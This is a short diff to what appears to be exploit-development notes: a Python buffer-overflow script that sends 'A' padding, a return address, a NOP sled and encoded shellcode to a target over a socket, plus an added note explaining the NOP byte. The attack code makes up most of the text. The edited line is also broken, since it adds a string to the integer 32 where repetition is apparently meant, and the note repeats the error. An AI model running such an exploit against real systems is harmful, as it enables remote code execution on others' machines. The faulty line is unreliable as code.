@@ -49,7 +49,7 @@ overflow = ("\xbe\xa0\x7a\x1b\xf1\xdb\xdf\xd9\x74\x24\xf4\x58\x29\xc9"
 "\x9c\xdd\x74\x8b\x99\x9a\x32\x60\xd0\xb3\xd6\x86\x47\xb3"
 "\xf2")
 
-shellcode = "A" * 2003 + "\xaf\x11\x50\62" + overflow
+shellcode = "A" * 2003 + "\xaf\x11\x50\62" + "\x90" + 32 + overflow
 
 try: 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -62,3 +62,4 @@ except:
         sys.exit()
 ```
 
+Note that the `"\x90" + 32` in `shellcode = "A" * 2003 + "\xaf\x11\x50\62" + "\x90" + 32 + overflow` is called a noop which mean No Operation
